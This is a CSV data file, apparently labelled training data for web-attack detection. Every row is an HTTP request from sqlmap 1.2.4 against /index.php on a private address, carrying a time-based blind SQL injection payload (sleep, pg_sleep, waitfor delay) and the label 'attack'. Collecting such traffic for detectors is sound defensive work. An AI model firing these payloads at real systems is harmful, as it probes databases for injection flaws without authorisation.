/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs' (select 'nqai' where 6370=6370 and elt(9413=9413,sleep(5))#",attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs')) as adem where 7481=7481 and elt(9413=9413,sleep(5))#",attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs"")) as whjz where 2823=2823 and elt(9413=9413,sleep(5))#",attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs') as uzyx where 1792=1792 and elt(9413=9413,sleep(5))#",attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs"") as uowr where 7596=7596 and elt(9413=9413,sleep(5))#",attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs' in boolean mode) and elt(9413=9413,sleep(5))#",attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs) and elt(9413=9413,sleep(5))#",attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs)) and elt(9413=9413,sleep(5))#",attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs))) and elt(9413=9413,sleep(5))#",attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs and elt(9413=9413,sleep(5))#",attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs) where 5616=5616 and elt(9413=9413,sleep(5))#",attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs where 1521=1521 and elt(9413=9413,sleep(5))#",attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs)) as sljy where 2914=2914 and elt(9413=9413,sleep(5))#",attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs) as jrbn where 9734=9734 and elt(9413=9413,sleep(5))#",attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs` where 2118=2118 and elt(9413=9413,sleep(5))#",attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs`) where 3404=3404 and elt(9413=9413,sleep(5))#",attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs') and 4408=(select 4408 from pg_sleep(5))-- tnwa,attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs' and 4408=(select 4408 from pg_sleep(5))-- nfjo,attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs' and 4408=(select 4408 from pg_sleep(5)) and 'oyog'='oyog,attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs') and 4408=(select 4408 from pg_sleep(5)) and ('cuwq' like 'cuwq,attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs')) and 4408=(select 4408 from pg_sleep(5)) and (('mbji' like 'mbji,attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs' and 4408=(select 4408 from pg_sleep(5)) and 'oknc' like 'oknc,attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs"") and 4408=(select 4408 from pg_sleep(5)) and (""tcmq""=""tcmq",attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs"")) and 4408=(select 4408 from pg_sleep(5)) and ((""yjzg""=""yjzg",attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs"" and 4408=(select 4408 from pg_sleep(5)) and ""olpo""=""olpo",attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs"") and 4408=(select 4408 from pg_sleep(5)) and (""xhoz"" like ""xhoz",attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs"")) and 4408=(select 4408 from pg_sleep(5)) and ((""uciw"" like ""uciw",attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs""))) and 4408=(select 4408 from pg_sleep(5)) and (((""oogn"" like ""oogn",attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs%') and 4408=(select 4408 from pg_sleep(5)) and ('%'=',attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs%'))) and 4408=(select 4408 from pg_sleep(5)) and ((('%'=',attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs%"") and 4408=(select 4408 from pg_sleep(5)) and (""%""=""",attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs%"")) and 4408=(select 4408 from pg_sleep(5)) and ((""%""=""",attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs%""))) and 4408=(select 4408 from pg_sleep(5)) and (((""%""=""",attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs%"" and 4408=(select 4408 from pg_sleep(5)) and ""%""=""",attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs') where 8852=8852 and 4408=(select 4408 from pg_sleep(5))-- xvks,attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs"") where 5415=5415 and 4408=(select 4408 from pg_sleep(5))-- wypz",attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs"" where 1076=1076 and 4408=(select 4408 from pg_sleep(5))-- mvak",attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs'||(select 'ykvw' where 4056=4056 and 4408=(select 4408 from pg_sleep(5)))||',attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs' (select uztv where 2769=2769 and 4408=(select 4408 from pg_sleep(5))) ',attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs' (select 'ccgu' where 3653=3653 and 4408=(select 4408 from pg_sleep(5))) ',attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs')) as ehte where 6324=6324 and 4408=(select 4408 from pg_sleep(5))-- oefv,attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs"")) as jynk where 2803=2803 and 4408=(select 4408 from pg_sleep(5))-- vgks",attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs"") as qcmj where 4360=4360 and 4408=(select 4408 from pg_sleep(5))-- noty",attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs' in boolean mode) and 4408=(select 4408 from pg_sleep(5))#,attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs) and 4408=(select 4408 from pg_sleep(5)) and (4621=4621,attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs)) and 4408=(select 4408 from pg_sleep(5)) and ((9002=9002,attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs))) and 4408=(select 4408 from pg_sleep(5)) and (((8152=8152,attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs and 4408=(select 4408 from pg_sleep(5)),attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs and 4408=(select 4408 from pg_sleep(5))-- xyks,attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs and 4408=(select 4408 from pg_sleep(5))# dcwh,attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs) as wqrr where 9058=9058 and 4408=(select 4408 from pg_sleep(5))-- eqxu,attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs`) where 1751=1751 and 4408=(select 4408 from pg_sleep(5))-- cxot,attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs') and 1776=(select 1776 from pg_sleep(5))--,attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs' and 1776=(select 1776 from pg_sleep(5))--,attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs"" and 1776=(select 1776 from pg_sleep(5))--",attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs')) and 1776=(select 1776 from pg_sleep(5))--,attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs'))) and 1776=(select 1776 from pg_sleep(5))--,attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs"") and 1776=(select 1776 from pg_sleep(5))--",attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs"")) and 1776=(select 1776 from pg_sleep(5))--",attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs""))) and 1776=(select 1776 from pg_sleep(5))--",attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs%') and 1776=(select 1776 from pg_sleep(5))--,attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs%')) and 1776=(select 1776 from pg_sleep(5))--,attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs%'))) and 1776=(select 1776 from pg_sleep(5))--,attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs%' and 1776=(select 1776 from pg_sleep(5))--,attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs%""))) and 1776=(select 1776 from pg_sleep(5))--",attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs%"" and 1776=(select 1776 from pg_sleep(5))--",attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs' where 1962=1962 and 1776=(select 1776 from pg_sleep(5))--,attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs'||(select 'omal' where 9353=9353 and 1776=(select 1776 from pg_sleep(5))--,attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs' (select ldxs where 5440=5440 and 1776=(select 1776 from pg_sleep(5))--,attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs' (select 'givs' where 8720=8720 and 1776=(select 1776 from pg_sleep(5))--,attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs"")) as xzvq where 7463=7463 and 1776=(select 1776 from pg_sleep(5))--",attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs') as vgcz where 2580=2580 and 1776=(select 1776 from pg_sleep(5))--,attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs"") as cuvw where 4021=4021 and 1776=(select 1776 from pg_sleep(5))--",attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs' in boolean mode) and 1776=(select 1776 from pg_sleep(5))--,attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs) and 1776=(select 1776 from pg_sleep(5))--,attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs)) and 1776=(select 1776 from pg_sleep(5))--,attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs))) and 1776=(select 1776 from pg_sleep(5))--,attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs and 1776=(select 1776 from pg_sleep(5))--,attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs) where 7627=7627 and 1776=(select 1776 from pg_sleep(5))--,attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs where 4473=4473 and 1776=(select 1776 from pg_sleep(5))--,attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs)) as lydk where 1392=1392 and 1776=(select 1776 from pg_sleep(5))--,attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs) as qvmd where 2016=2016 and 1776=(select 1776 from pg_sleep(5))--,attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs` where 7937=7937 and 1776=(select 1776 from pg_sleep(5))--,attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs') waitfor delay '0:0:5'-- spob,attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs' waitfor delay '0:0:5'-- kvzu,attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs"" waitfor delay '0:0:5'-- pgjk",attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs') waitfor delay '0:0:5' and ('xwcw'='xwcw,attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs' waitfor delay '0:0:5' and 'kbnz'='kbnz,attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs') waitfor delay '0:0:5' and ('wxwk' like 'wxwk,attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs')) waitfor delay '0:0:5' and (('kmsx' like 'kmsx,attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs'))) waitfor delay '0:0:5' and ((('owbk' like 'owbk,attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs"") waitfor delay '0:0:5' and (""uiae""=""uiae",attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs""))) waitfor delay '0:0:5' and (((""qenc""=""qenc",attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs"" waitfor delay '0:0:5' and ""vhsf""=""vhsf",attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs"")) waitfor delay '0:0:5' and ((""aewi"" like ""aewi",attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs""))) waitfor delay '0:0:5' and (((""hwqp"" like ""hwqp",attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs"" waitfor delay '0:0:5' and ""syub"" like ""syub",attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs%') waitfor delay '0:0:5' and ('%'=',attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs%'))) waitfor delay '0:0:5' and ((('%'=',attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs%' waitfor delay '0:0:5' and '%'=',attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs%"") waitfor delay '0:0:5' and (""%""=""",attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs%"")) waitfor delay '0:0:5' and ((""%""=""",attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs%""))) waitfor delay '0:0:5' and (((""%""=""",attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs%"" waitfor delay '0:0:5' and ""%""=""",attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs') where 5942=5942 waitfor delay '0:0:5'-- kdsg,attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs"") where 5847=5847 waitfor delay '0:0:5'-- ycbz",attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs"" where 9198=9198 waitfor delay '0:0:5'-- nhnu",attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs'||(select 'atwk' from dual where 8266=8266 waitfor delay '0:0:5')||',attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs' (select bfec where 1846=1846 waitfor delay '0:0:5') ',attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs' (select 'vdfd' where 7518=7518 waitfor delay '0:0:5') ',attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs')) as jxrn where 3974=3974 waitfor delay '0:0:5'-- eehp,attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs"")) as lleb where 5587=5587 waitfor delay '0:0:5'-- cbsm",attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs') as cbry where 5585=5585 waitfor delay '0:0:5'-- evqt,attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs"") as bzyu where 4456=4456 waitfor delay '0:0:5'-- idny",attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs' in boolean mode) waitfor delay '0:0:5'#,attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs) waitfor delay '0:0:5'-- emud,attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs) waitfor delay '0:0:5' and (7394=7394,attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs)) waitfor delay '0:0:5' and ((3398=3398,attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs))) waitfor delay '0:0:5' and (((2075=2075,attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs waitfor delay '0:0:5'# olon,attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs) where 6092=6092 waitfor delay '0:0:5'-- rmvu,attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs where 1326=1326 waitfor delay '0:0:5'-- beaa,attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs)) as qvre where 3081=3081 waitfor delay '0:0:5'-- dogd,attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs) as wldn where 7191=7191 waitfor delay '0:0:5'-- ryyn,attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs` where 5193=5193 waitfor delay '0:0:5'-- oveo,attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs`) where 5549=5549 waitfor delay '0:0:5'-- tygi,attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs') waitfor delay '0:0:5'--,attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs"" waitfor delay '0:0:5'--",attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs')) waitfor delay '0:0:5'--,attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs"") waitfor delay '0:0:5'--",attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs"")) waitfor delay '0:0:5'--",attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs""))) waitfor delay '0:0:5'--",attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs%') waitfor delay '0:0:5'--,attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs%')) waitfor delay '0:0:5'--,attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs%'))) waitfor delay '0:0:5'--,attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs%' waitfor delay '0:0:5'--,attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs%"")) waitfor delay '0:0:5'--",attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs%"" waitfor delay '0:0:5'--",attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs') where 6870=6870 waitfor delay '0:0:5'--,attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs' where 7762=7762 waitfor delay '0:0:5'--,attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs"" where 7007=7007 waitfor delay '0:0:5'--",attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs'||(select 'rhsu' from dual where 2146=2146 waitfor delay '0:0:5'--,attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs' (select axvp where 6407=6407 waitfor delay '0:0:5'--,attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)",sdcs')) as suzs where 3187=3187 waitfor delay '0:0:5'--,attack
/index.php,None,"*/* gzip,deflate close http://192.168.175.220:80/index.php sqlmap/1.2.4#stable (http://sqlmap.org)","sdcs"")) as tqqc where 7034=7034 waitfor delay '0:0:5'--",attack
